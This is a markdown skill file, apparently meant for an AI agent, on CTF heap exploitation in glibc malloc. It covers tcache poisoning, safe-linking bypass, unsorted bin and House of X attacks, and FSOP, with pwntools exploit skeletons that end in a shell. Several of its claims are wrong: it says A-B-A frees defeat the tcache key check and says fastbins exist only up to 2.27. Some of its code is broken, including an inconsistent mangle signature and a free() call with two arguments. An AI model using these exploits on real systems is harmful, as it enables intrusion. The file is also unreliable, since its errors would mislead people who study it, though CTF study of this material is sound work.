---
name: ctf-pwn-heap
description: Heap exploitation in CTFs — glibc malloc internals, fastbin/tcache/unsorted attacks, UAF, double-free, house of force/spirit/one/lore, and FSOP
---

# CTF Heap Exploitation

Heap pwn is the deepest corner of CTF. Almost all modern heap challenges use **glibc malloc** (ptmalloc2). This skill covers the techniques that actually work on glibc 2.23–2.39, with a focus on what's still exploitable in 2024+.

## 0. Mental Model

A chunk in glibc malloc has this layout:

```
+----------------------+
| prev_size  (8 bytes) | ← only valid if previous chunk is free
+----------------------+
| size       (8 bytes) | ← low 3 bits are flags: P (prev in use), M (mmap'd), A (non-main arena)
+----------------------+
| user data  (8+ bytes)| ← malloc returns pointer here
| ...                  |
+----------------------+
```

**Key sizes:**
- **tcache** (glibc 2.26+): per-thread LIFO cache for 7 chunks per size class (0x20–0x410). The fastest path. Most modern UAF / double-free writeups start here.
- **fastbin** (glibc 2.23–2.27): single-linked free list, sizes 0x20–0x80 (32-bit) / 0x20–0xb0 (64-bit). LIFO.
- **unsorted bin**: a doubly-linked list of freed chunks of any size, drained into the appropriate small/large bin when needed.
- **small bin / large bin**: size-sorted, used for non-fastbin allocation.

## 1. The "First 5 Minutes" Heap Triage

```bash
# Run with: MALLOC_CHECK_=3 to surface errors loudly
# Or with: glibc malloc tunables to force a specific path
MALLOC_TCACHE_COUNT=0 ./chall   # disable tcache (forces fastbin/unsorted)
MALLOC_MMAP_MAX_=0 ./chall     # disable mmap for large chunks
MALLOC_PERTURB_=42 ./chall     # fill freed memory with 0x2a*8+counter (predictable leaks)

# Watch the heap state in gdb with pwndbg
# pwndbg adds:
#   heap               # show all chunks
#   arena              # show main arena
#   bins               # show all bin contents
#   tcache             # show tcache contents
#   malloc <size>      # alloc a chunk
#   free <ptr>         # free a chunk
#   vis                # visual heap (great for screenshots)
```

## 2. Tcache Poisoning (glibc 2.29–2.31)

The tcache is a singly-linked list of free chunks. If you can **overwrite the `fd` pointer of a freed tcache chunk**, the next allocation returns a pointer to wherever you wrote.

```c
// Vuln: read(0, chunk, huge_size)  // heap overflow
// Or:   use-after-free on a tcache chunk
// Goal: overwrite fd → next malloc returns arbitrary address
```

**Exploit skeleton:**
```python
def add(size): pass     # allocate a chunk
def free(idx): pass     # free a chunk

# 1. Free a chunk into tcache
free(0)               # tcache[0x20] → chunk0
# 2. Overwrite chunk0's fd via heap overflow or UAF
edit(0, p64(target_addr))    # tcache[0x20] → target_addr (next alloc returns target_addr)
# 3. Two allocs return: first → original chunk, second → target_addr
add(0x18)             # returns chunk0
add(0x18)             # returns target_addr
# 4. Write to target_addr to overwrite something interesting
```

**Counter-measures in glibc 2.32+:**
- `safe-linking` (glibc 2.32) mangles tcache fd: `fd = (chunk_addr >> 12) ^ new_fd`. You need a heap address leak to compute the mangled value.
- `align`-based pointer checks: the next pointer must be aligned.

**Bypass safe-linking (2.32+):**
```python
heap_leak = ...    # address of the freed chunk
def mangle(addr):
    return (heap_leak >> 12) ^ addr
edit(0, p64(mangle(target_addr)))
```

## 3. UAF → tcache/fastbin dup

Use-after-free means the program frees a chunk but you still hold a pointer to it. You can:
1. Free the chunk (goes to tcache)
2. Re-write the freed chunk's `fd` (still in tcache)
3. Allocate twice → second allocation is at your address

The classic `tcache dup` requires **double-free**, which glibc 2.29+ checks via a `key` field in the chunk. To bypass:
- Free A → free B → free A (`tcache[A, B, A]`) — the double-free check is on A's first free, so a different chunk in between resets it.
- Or: free A → free B → use overflow to overwrite A's `key` field to 0 → free A.

## 4. Unsorted Bin Attack (glibc 2.23–2.27)

When a chunk is freed into the unsorted bin, glibc writes the address of `main_arena.bins` into the chunk's `fd` and `bk`. The unsorted bin attack overwrites `bk`'s target with `&main_arena.bins`. Useful for one-shot `__malloc_hook` overwrite (glibc < 2.34).

```python
# 1. Trigger a chunk to be freed into unsorted bin (size > 0x80 typically)
free(1)              # not tcache (tcache full or size too big)
# 2. Read the leak — chunk's fd/bk now contain main_arena pointers
leak = u64(io.recv(...).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['main_arena'] - 0x58  # offset varies
# 3. Overwrite bk with target - 0x10
edit(1, p64(0) + p64(target - 0x10))
# 4. Next malloc of that size: target is written with main_arena.bins address
```

**Caveats:** writes an arena pointer, not a controllable value. Modern glibc adds a check that the chunk is mmap'd and the bk points to the arena, which kills this attack.

## 5. House of Force (glibc 2.23–2.27)

Heap overflow lets you overwrite the **top chunk's size** to a huge value (e.g. `0xffffffffffffffff`). Then `malloc(large_number)` advances the top chunk to wrap around and overlap with the target address. Next allocation lands at the target.

```python
# 1. Heap overflow to overwrite top chunk size
edit(0, b'A' * size_of_chunk + p64(0xffffffffffffffff))
# 2. malloc a large size to advance top chunk
distance = target - (top_addr + 0x10)
malloc(distance)      # the allocation just bumps the pointer, returns top
# 3. Next allocation lands at target
malloc(size_at_target)
# 4. Write to target (e.g. __malloc_hook)
```

Modern glibc kills this with `__libc_malloc` checks on the top chunk size. The fix: glibc 2.29+ asserts top chunk size is sane.

## 6. House of Spirit

Free a chunk at an attacker-controlled address (e.g. on the stack). When that fake chunk is allocated and freed, glibc adds it to the fastbin. The next fastbin alloc returns the controlled address.

Use case: bypass canary with a stack-targeted allocation.

## 7. House of Lore

Unsorted/small bin attack variant. Forge a small bin's `bk` to point to a fake chunk; the next small-bin allocation returns a pointer to your controlled memory. Very version-sensitive.

## 8. tcache stashing unlink (glibc 2.29–2.32)

When small bins are present during tcache refill, glibc moves chunks from small bin to tcache. By forging the small bin chain, you can get an **arbitrary write** in tcache. The 2021+ writeup canonical.

## 9. House of One / FSOP

**File Stream Oriented Programming (FSOP):** corrupt `_IO_list_all` (in libc) to point to a fake `_IO_FILE_plus` whose vtable's `__overflow` calls `system("/bin/sh")` or equivalent. Then trigger `_IO_flush_all_lockp` (e.g. via `exit(0)` or an error path). This is a one-shot technique used in many 2023+ writeups.

```python
# Reference: https://github.com/ray-cp/pwn_demos (House of Apple, House of Kiwi, House of Banana)
# Modern variants:
#   - House of Apple 2: corrupt _IO_wide_data
#   - House of Kiwi:    corrupt _IO_file_jumps vtable to a fake vtable
#   - House of Banana:  vtable inside _IO_str_jumps (smaller constraint)
#   - House of Cat:     vtable through _IO_wfile_jumps
```

The 2024+ default for "I have a heap write primitive, give me RCE" is House of Apple 2 (glibc 2.34–2.37).

## 10. Safe-Linking Bypass (glibc 2.32+)

```python
def demangle(fd, pos):
    """Recover the next pointer from a safe-linked tcache fd."""
    return (pos >> 12) ^ fd

def mangle(next_ptr, pos):
    """Encode the next pointer for tcache fd."""
    return (pos >> 12) ^ next_ptr
```

You need a heap address to demangle/mangle. Heap addresses leak from the same UAF primitive, or via unsorted bin pointers (which are libc but adjacent to heap).

## 11. Large Bin Attack (glibc 2.30+)

A large-bin insertion triggers a write of `next->fd_nextsize` and `next->bk_nextsize` based on the existing chunk's addresses. By positioning a chunk at a known heap address, you can **write a heap address to an arbitrary location**. Used as a "write primitive" to set up `__free_hook` or `__malloc_hook`.

**Glibc 2.30+** added a check that the chunk sizes match, but the `fd_nextsize` write is still exploitable. The 2023+ writeups use this as a write-what-where primitive.

## 12. Common Heap Exploitation Pattern

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = elf.libc

def slop(): print("[*] running step")
def add(sz): io.sendlineafter(b'> ', b'1'); io.sendlineafter(b': ', str(sz).encode())
def free(idx): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b': ', str(idx).encode())
def edit(idx, data): io.sendlineafter(b'> ', b'3'); io.sendlineafter(b': ', str(idx).encode()); io.send(data)

# 1. Leak heap
add(0x18); free(0)
heap_leak = u64(io.recv(...).ljust(8, b'\x00')) & ~0xfff   # rough
# 2. Leak libc
add(0x500); free(1)   # size > tcache max → unsorted bin
libc_leak = u64(io.recv(...).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ecbe0   # main_arena + 0x60 offset for the chunk
# 3. Tcache poison
add(0x18); add(0x18); free(3); free(4)
edit(3, p64(mangle(0, heap_leak)))  # or wherever
add(0x18); add(0x18)   # second one returns arbitrary address
# 4. Write to __free_hook
edit(5, p64(libc.symbols['system']))
free(2, b'/bin/sh')    # or similar trigger
io.interactive()
```

## 13. Modern Tips (glibc 2.35+)

`__malloc_hook` and `__free_hook` were **removed in glibc 2.34**. The new RCE paths are:

- **FSOP (House of Apple 2 / Kiwi / Banana / Cat / Emma)** — corrupt `_IO_list_all` or a vtable
- **`_rtld_global._dl_load_lock`** — corrupt the dynamic loader's internal state
- **Exit handlers** — corrupt `__exit_funcs`
- **Stack pivot + ROP** — overwrite a function pointer and trigger it
- **Tcache + tcache_perthread_struct** — overwrite the tcache counts/entries to make the allocator return an arbitrary chunk

For 2024+ CTFs, the answer is **almost always "FSOP via House of Apple 2"** if the binary is glibc 2.35–2.38, or **one of the House of X series** for older versions.

## Common Pitfalls

- **Tcache key double-free check** — glibc 2.29+ stores the tcache per-thread address in `chunk->bk` (the `key` field). Freeing twice is detected. Bypass with another free in between, or overwrite the key.
- **Safe-linking requires a heap leak** — don't try to tcache poison without first leaking a heap address.
- **Unsorted bin leak offset is glibc-version-specific** — the offset between the leaked pointer and `libc.address` is `main_arena.bins[0]` minus 0x10. The exact bytes vary; the symbol `main_arena+0x60` (or `main_arena+96`) is the typical calc.
- **Tcache count overflow** — the tcache count is a 1-byte field (0-7). To poison, free the right number of times.
- **Don't use `free(0)` literally** — `free(NULL)` is a no-op. Use a real index.
- **The order of `add()` and `edit()` matters** — write up a state machine in your head: track which indices are free, what's in tcache, what the next alloc returns.
- **Forgetting `tcache thread` is per-thread** — multi-threaded apps have separate tcache per thread. The leak from one thread may not help another.

## Tooling

```bash
# glibc-all-in-one: pre-built libc/ld pairs
git clone https://github.com/matrix1001/glibc-all-in-one
./glibc-all-in-one/list    # list available versions
./glibc-all-in-one/download 2.35-0ubuntu3
./glibc-all-in-one/get 2.35  # extract to libs/

# patchelf: swap libc/ld on a binary
patchelf --set-interpreter ./libs/2.35/ld-linux-x86-64.so.2 --set-rpath ./libs/2.35 ./chall

# pwndbg heap helpers (see recon.md)
heap, bins, tcache, vis

# House of X references
https://github.com/ray-cp/pwn_demos
https://arttnba3.cn/2022/08/30/pwn-got-hijack-with-house-of-apple/
```
